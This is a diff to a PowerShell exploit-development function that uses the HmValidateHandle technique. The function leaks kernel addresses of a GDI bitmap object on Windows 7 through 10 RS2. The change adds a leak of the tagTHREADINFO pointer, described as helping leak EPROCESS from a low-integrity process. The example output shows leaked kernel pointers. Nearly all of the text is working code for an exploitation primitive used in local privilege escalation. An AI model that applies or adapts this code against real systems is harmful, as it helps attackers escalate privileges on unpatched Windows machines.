@@ -1,7 +1,7 @@
 function Stage-HmValidateHandleBitmap {
 <#
 .SYNOPSIS
-	Universal x64 Bitmap leak using HmValidateHandle.
+	Universal x64 Bitmap leak using HmValidateHandle. Includes tagTHREADINFO pointer to facilitate low integrity EPROCESS leak.
 	Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2
 
 	Resources:
@@ -17,9 +17,10 @@ function Stage-HmValidateHandleBitmap {
 .EXAMPLE
 	PS C:\Users\b33f> Stage-HmValidateHandleBitmap |fl
 	
-	BitmapKernelObj : -7692235059200
-	BitmappvScan0   : -7692235059120
-	BitmapHandle    : 1845828432
+	tagTHREADINFO   : -7693316289488
+	BitmappvScan0   : -7693315010480
+	BitmapKernelObj : -7693315010560
+	BitmapHandle    : 419758522
 	
 	PS C:\Users\b33f> $Manager = Stage-HmValidateHandleBitmap
 	PS C:\Users\b33f> "{0:X}" -f $Manager.BitmapKernelObj
@@ -188,7 +189,13 @@ function Stage-HmValidateHandleBitmap {
 		# Calculate ulClientDelta & leak lpszMenuName
 		$ulClientDelta = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+0x20) - $lpUserDesktopHeapWindow.ToInt64()
 		$KerneltagCLS = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+$pCLSOffset)
-		[System.Runtime.InteropServices.Marshal]::ReadInt64($KerneltagCLS-$ulClientDelta+$lpszMenuNameOffset)
+		
+		# Create object to store _THRDESKHEAD.pti & lpszMenuName pointers
+		$HashTable = @{
+			tagTHREADINFO = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+0x10)
+			lpszMenuName = [System.Runtime.InteropServices.Marshal]::ReadInt64($KerneltagCLS-$ulClientDelta+$lpszMenuNameOffset)
+		}
+		New-Object PSObject -Property $HashTable
 	}
 	
 	#------------------[Bitmap Leak]
@@ -197,7 +204,7 @@ function Stage-HmValidateHandleBitmap {
 		$TestWindowHandle = Create-WindowObject
 		$KernelArray += Leak-lpszMenuName -WindowHandle $TestWindowHandle
 		if ($KernelArray.Length -gt 1) {
-			if ($KernelArray[$i] -eq $KernelArray[$i-1]) {
+			if ($KernelArray[$i].lpszMenuName -eq $KernelArray[$i-1].lpszMenuName) {
 				Destroy-WindowObject -Handle $TestWindowHandle
 				[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
 				$BitmapHandle = [HmValidateHandleBitmap]::CreateBitmap(0x701, 2, 1, 8, $Buffer) # +4 kb size
@@ -210,8 +217,9 @@ function Stage-HmValidateHandleBitmap {
 	$BitMapObject = @()
 	$HashTable = @{
 		BitmapHandle = $BitmapHandle
-		BitmapKernelObj = $($KernelArray[$i])
-		BitmappvScan0 = $KernelArray[$i] + 0x50
+		BitmapKernelObj = $($KernelArray[$i].lpszMenuName)
+		BitmappvScan0 = $($KernelArray[$i].lpszMenuName) + 0x50
+		tagTHREADINFO = $($KernelArray[$i].tagTHREADINFO)
 	}
 	$Object = New-Object PSObject -Property $HashTable
 	$BitMapObject += $Object
